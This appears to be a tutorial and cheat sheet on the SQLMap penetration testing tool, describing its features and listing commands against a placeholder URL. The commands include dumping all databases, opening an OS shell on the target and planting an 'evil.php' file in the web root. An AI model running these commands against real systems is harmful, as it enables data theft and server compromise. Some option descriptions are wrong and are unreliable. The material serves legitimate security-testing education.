-- What is the purpose of SQLMap --

SQLMAP is an open source penetration testing tool. SQLMAP automates the process of discovering SQL injection flaws and exploits them to access and provide control over database servers. 
In addition, it has advanced features, including its proprietary detection engine, in support of penetration testing.

• SQL Injection Testing: SQLMap automates the detection and exploitation of SQL injection vulnerabilities in web applications. It systematically tests different payloads to identify weak points.
• Database Schema: SQLMap enumerates the databases, tables, and columns in a vulnerable database. It allows to consider the database schema in detail, so it is very important for further analysis.
• Data Extraction: SQLMap extracts user-requested data from a vulnerable database. Seeing the ability to extract data from the user may allow the impact of the vulnerability to be estimated.
• Database Management: SQLMap performs various database management tasks and executing spesific SQL commands. It allows security professionals to manage the database remotely, providing valuable insights into database configurations and settings.
• Support for Multiple Databases: SQLMap is compatible with various database management systems such as MySQL, PostgreSQL, Oracle, Microsoft SQL Server and SQLite. This versatility allows SQLMap to be used with more users in a variety of environments and to work more integrated with other tools.


-- Core Features --

• Automatic SQL Injection Detection
• Database Fingerprinting
• Database Enumeration
• Data Extraction
• Access to the File System
• Privilege Escalation
• Support for Multiple Database Systems
• Advanced Injection Techniques
• Customizable Payloads and Options
• Batch and Automation Support


-- Data sources --

• Target Application Data
• Database Management Systems (DBMS)
• Public Vulnerability Databases
• Security Advisories and Exploits
• Database Error Messages
• Network Traffic
• Input Parameters and Forms
• Historical Scan Data


-- Common SQLMap Commands --

➜ Basic SQL Injection Test: sqlmap -u <target_URL>
➜ Enumerating Databases: sqlmap -u <target_URL> --dbs
➜ Enumerating Tables: sqlmap -u <target_URL> -D <database_name> --tables
➜ Enumerating Columns: sqlmap -u <target_URL> -D <database_name> -T <table_name> --columns
➜ Data Extraction: sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump
➜ Testing for Blind SQL Injection: sqlmap -u <target_URL> --technique=BLIND
➜ Specifying a Custom HTTP Header: sqlmap -u <target_URL> --header="Custom-Header: Value"
➜ Using Proxy for Traffic Analysis: sqlmap -u <target_URL> --proxy="http://127.0.0.1:8080"
➜ Saving Output to a File: sqlmap -u <target_URL> --output-dir=<directory>
➜ Help and Usage Information: sqlmap -h | sqlmap --help

-- Output Examples of SQLMap Commands --

Tests a URL for SQL injection vulnerabilities: sqlmap -u "http://example.com/vulnerable.php?id=1"	
Tests for blind SQL injection vulnerabilities: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=BLIND
Tests specifically for time-based SQL injection vulnerabilities: sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=TIME

Retrieves the list of databases: sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
Lists tables in the specified database: sqlmap -u "http://example.com/vulnerable.php?id=1" -D users --tables
Lists columns in the specified table: sqlmap -u "http://example.com/vulnerable.php?id=1" -D users -T accounts --columns

Extracts data from the specified table: sqlmap -u "http://example.com/vulnerable.php?id=1" -D users -T accounts --dump
Dumps all data from all databases: sqlmap -u "http://example.com/vulnerable.php?id=1" --dump-all
Sends a request with a custom HTTP header: sqlmap -u "http://example.com/vulnerable.php?id=1" --header="Custom-Header: Value"

Uses specified cookies in the request: sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="SESSIONID=abc123"
Routes traffic through a specified proxy: sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"
Saves output to the specified directory: sqlmap -u "http://example.com/vulnerable.php?id=1" --output-dir=output

Opens a SQL shell for manual SQL command execution: sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell
Executes system commands on the target server: sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
Checks for file inclusion vulnerabilities: sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write=evil.php

Uploads a file to the target server: sqlmap -u "http://example.com/vulnerable.php?id=1" --file-dest="/var/www/evil.php"
Loads configuration options from a file: sqlmap -u "http://example.com/vulnerable.php?id=1" --conf-file=config.txt
Provides detailed output of the process: sqlmap -u "http://example.com/vulnerable.php?id=1" --verbose=3

Sets a custom User-Agent for the request: sqlmap -u "http://example.com/vulnerable.php?id=1" --user-agent="Mozilla/5.0"
Specifies the HTTP method and data for testing: sqlmap -u "http://example.com/vulnerable.php?id=1" --method=POST --data="user=admin&pass=123"
Attempts to bypass Web Application Firewalls: sqlmap -u "http://example.com/vulnerable.php?id=1" --waf


